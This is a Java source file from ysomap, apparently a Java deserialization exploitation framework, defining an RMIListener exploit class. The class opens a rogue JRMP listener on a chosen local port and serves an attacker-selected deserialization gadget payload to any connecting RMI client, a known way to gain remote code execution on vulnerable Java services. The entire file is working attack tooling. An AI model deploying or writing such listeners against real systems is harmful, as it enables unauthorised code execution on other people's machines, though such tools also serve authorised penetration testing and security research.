package ysomap.core.exploit.rmi;

import ysomap.common.annotation.*;
import ysomap.core.bean.Exploit;
import ysomap.core.exploit.rmi.component.FakeRMIHandler;
import ysomap.common.util.Logger;

import java.io.IOException;

/**
 * @author wh1t3P1g
 * @since 2020/2/26
 */
@Exploits
@Authors({Authors.WH1T3P1G})
@Require(bullets = {"all gadgets"}, param = false)
@Dependencies({"need set a gadget to return"})
public class RMIListener extends Exploit {

    @NotNull
    @Require(name = "lport", type = "int", detail = "local port to start a RMI service")
    public String lport;

    @NotNull
    public Object payload;

    public String payloadName;

    public FakeRMIHandler handler;

    @Override
    public void work() {
        needRunning = true;
        try {
            Logger.success("Opening JRMP listener on " + lport);
            handler = new FakeRMIHandler(Integer.parseInt(lport), payload);
            handler.run();
        } catch (IOException e) {
            Logger.error("Listener error");
            e.printStackTrace();
        }
    }

    @Override
    public void stop() {
        if(handler != null){
            handler.close();
            Logger.success("JRMP listener stopped");
        }
        exit = true;
    }

    @Override
    public String toString() {
        return "RMIListener{" +
                "lport='" + lport + '\'' +
                ", payload=" + payloadName +
                '}';
    }

}
